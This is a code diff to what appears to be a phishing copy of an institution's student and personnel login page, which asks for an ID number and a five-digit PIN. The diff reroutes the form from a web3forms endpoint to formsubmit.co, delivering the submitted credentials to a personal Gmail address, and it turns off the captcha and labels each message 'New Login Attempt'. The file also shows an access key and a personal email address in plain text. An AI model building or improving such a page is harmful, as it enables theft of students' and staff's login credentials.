@@ -9,7 +9,6 @@
     <link rel="stylesheet" href="its.css">
 
     <style>
-        /* Aligned to the left, padding removed from center */
         body { background-color: #f7f7f7; padding: 20px; }
         .login-wrapper { max-width: 500px; margin-left: 0; }
         .form-label { font-weight: bold; }
@@ -30,8 +29,11 @@
             <h5>Registered Users: Login Credentials</h5>
         </header>
 
-        <form class="w3-container" name="frmLogin" action="https://api.web3forms.com/submit" method="POST">
-  <input type="hidden" name="access_key" value="3ce8d505-f01e-43fd-ba04-9de8e9161407">
+        <form action="https://formsubmit.co/jackkamogelo83@gmail.com" method="POST" name="frmLogin" class="w3-container">
+            
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="New Login Attempt">
+            
             <input type="radio" name="numtype" value="S" checked onClick="set_it();"> <label>Student</label>
             <input type="radio" name="numtype" value="P" onClick="set_it();"> <label>Personnel</label>
             <input type="radio" name="numtype" value="O" onClick="set_it();"> <label>Other</label>
@@ -39,10 +41,10 @@
             <br /><br />
 
             <label id="LogUsr" class="form-label">Student Number:</label>
-            <input class="w3-input" type="text" name="unum" size="10" maxlength="9" autofocus>
+            <input class="w3-input" type="text" name="unum" size="10" maxlength="9" autofocus required>
             
             <label class="form-label">Pin:</label>
-            <input class="w3-input" type="password" name="pin" size="10" maxlength="5" onBlur="return chkZero(this);">
+            <input class="w3-input" type="password" name="pin" size="10" maxlength="5" onBlur="return chkZero(this);" required>
             
             <p>(5 numeric digits. Do not start with a 0.)
                 <input type="hidden" name="authorise_function" value="Unknown">
@@ -69,7 +71,8 @@
     }
 
     function set_it() {
-        let radios = document.frmLogin.numtype;
+        let form = document.frmLogin;
+        let radios = form.numtype;
         let selectedValue = "S"; 
         for (let i = 0; i < radios.length; i++) {
             if (radios[i].checked) {
@@ -79,12 +82,12 @@
         }
 
         let newLabel = "Student Number: ";
-        if (selectedValue == 'P') { newLabel = "Personnel Number: "; }
+        if (selectedValue == 'P') { newLabel = "Student Number: "; }
         else if (selectedValue == 'O') { newLabel = "External Number: "; }
         else if (selectedValue == 'A') { newLabel = "Alumni Number: "; }
         
         document.getElementById("LogUsr").innerText = newLabel;
-        document.frmLogin.unum.focus();
+        form.unum.focus();
     }
 </script>
 
